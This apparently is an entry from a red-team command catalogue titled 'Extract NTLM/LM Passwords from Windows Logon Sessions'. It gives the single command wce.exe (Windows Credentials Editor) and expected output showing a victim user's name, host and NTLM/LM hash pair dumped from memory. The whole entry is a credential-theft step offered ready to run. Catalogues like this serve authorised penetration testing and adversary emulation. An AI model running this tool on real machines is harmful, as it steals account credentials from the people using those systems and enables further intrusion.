---
id: 75439fba-9f19-4906-a64a-1be0543bcf47
name: Extract NTLM/LM Passwords from Windows Logon Sessions
type: command
executor: command_prompt
data: wce.exe
output: 'C:\Users\Victim\Downloads\stuff>wce.exe

  WCE v1.42beta (Windows Credentials Editor) - (c) 2010-2013 Amplia Security - by

  Hernan Ochoa (hernan@ampliasecurity.com)

  Use -h for help.


  BOB:BOB-PC:B34CE522C3E4C8774A3B108F3FA6CB6D:81ABA903C80B8F4DAAD5225F7D996FBC'
created_at: '2019-09-26T22:51:06.756447+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Extract NTLM/LM Passwords from Windows Logon Sessions

```command_prompt
wce.exe
```

## Expected Output

```
C:\Users\Victim\Downloads\stuff>wce.exe
WCE v1.42beta (Windows Credentials Editor) - (c) 2010-2013 Amplia Security - by
Hernan Ochoa (hernan@ampliasecurity.com)
Use -h for help.

BOB:BOB-PC:B34CE522C3E4C8774A3B108F3FA6CB6D:81ABA903C80B8F4DAAD5225F7D996FBC
```


